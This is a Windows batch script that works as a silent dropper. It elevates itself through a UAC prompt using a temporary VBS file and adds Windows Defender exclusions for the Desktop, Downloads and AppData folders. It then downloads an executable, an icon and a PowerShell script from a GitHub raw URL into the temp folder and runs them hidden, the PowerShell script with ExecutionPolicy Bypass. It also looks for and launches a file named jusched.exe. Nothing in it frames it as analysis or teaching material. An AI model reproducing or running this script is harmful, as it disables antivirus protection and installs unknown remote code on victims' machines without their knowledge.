@echo off
:: BatchGotAdmin

:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%TEMP%"
    CD /D "%~dp0"

    REM --> Silent PowerShell commands
    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Desktop'" >nul 2>&1
    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/Downloads'" >nul 2>&1
    powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%userprofile%/AppData/'" >nul 2>&1

    REM --> Navigate to the %TEMP% directory
    cd %TEMP%

    REM --> Download files silently using PowerShell
    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/XevioAIO.exe' -OutFile XevioAIO.exe" >nul 2>&1
    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/ahk.ico' -OutFile ahk.ico" >nul 2>&1
    powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/shortcut2.ps1' -OutFile shortcut2.ps1" >nul 2>&1

    REM --> Check if CritScript.exe exists silently
    if not exist "XevioAIO.exe" (
        exit /b
    )

    REM --> Execute CritScript.exe silently
    start /B "" XevioAIO.exe >nul 2>&1
    timeout /t 5 /nobreak >nul 2>&1

    REM --> Check and run JUSCHED.EXE if it exists
    for %%F in (jusched.exe JUSCHED.EXE) do (
        if exist "%%F" (
            start /B "" %%F >nul 2>&1
            timeout /t 5 /nobreak >nul 2>&1
            goto :CreateShortcut
        )
    )

:CreateShortcut
    REM --> Create shortcut for AIO.AHK if it exists
    set "zombiesScript=%TEMP%\AIO.AHK"
    set "iconPath=%TEMP%\ahk.ico"

    if exist "%zombiesScript%" (
        powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\shortcut2.ps1" >nul 2>&1
    )

    :ExitScript
    REM --> Exit the script
    exit /b
:--------------------------------------
